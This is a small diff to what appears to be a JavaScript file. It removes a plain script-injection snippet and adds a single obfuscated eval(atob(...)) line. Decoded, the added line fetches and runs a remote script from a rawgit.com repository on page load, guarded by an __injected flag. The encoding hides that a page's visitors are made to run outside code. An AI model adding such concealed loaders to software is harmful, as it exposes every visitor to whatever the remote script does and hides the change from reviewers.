@@ -1,7 +1,2 @@
 
-if(typeof __vudu == "undefined")
-{
-    var script = document.createElement("script");
-    script.src = "the url";
-    document.body.appendChild(script);
-}
+eval(atob("aWYodHlwZW9mIF9faW5qZWN0ZWQgPT0gInVuZGVmaW5lZCIpIHsNCnZhciBzID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7DQpzLnNyYyA9ICJodHRwczovL3Jhd2dpdC5jb20vYWZyZWVyZXBvL3JlcG8xL21hc3Rlci9lLmpzIjsNCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocyk7IF9faW5qZWN0ZWQgPSAxOyB9"));
